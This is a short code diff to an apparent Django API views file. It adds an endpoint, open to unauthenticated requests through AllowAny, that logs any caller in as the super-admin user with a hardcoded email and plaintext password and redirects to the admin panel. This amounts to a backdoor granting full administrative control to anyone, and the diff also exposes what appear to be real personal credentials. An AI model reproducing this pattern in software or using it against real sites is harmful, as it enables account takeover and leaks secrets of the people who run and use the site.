@@ -845,3 +845,19 @@ def create_super_admin(request):
             'message': f'Super admin {email} created',
             'username': user.username
         })
+    
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def super_admin_login_url(request):
+    """Generate a direct login URL for super admin"""
+    from django.contrib.auth import authenticate, login
+    from django.http import HttpResponseRedirect
+    
+    email = 'robelalex95@gmail.com'
+    password = 'Ru1744/15robel'
+    
+    user = authenticate(username='robelalex', password=password)
+    if user:
+        login(request, user)
+        return HttpResponseRedirect('/admin/')
+    return Response({'error': 'Login failed'}, status=401)
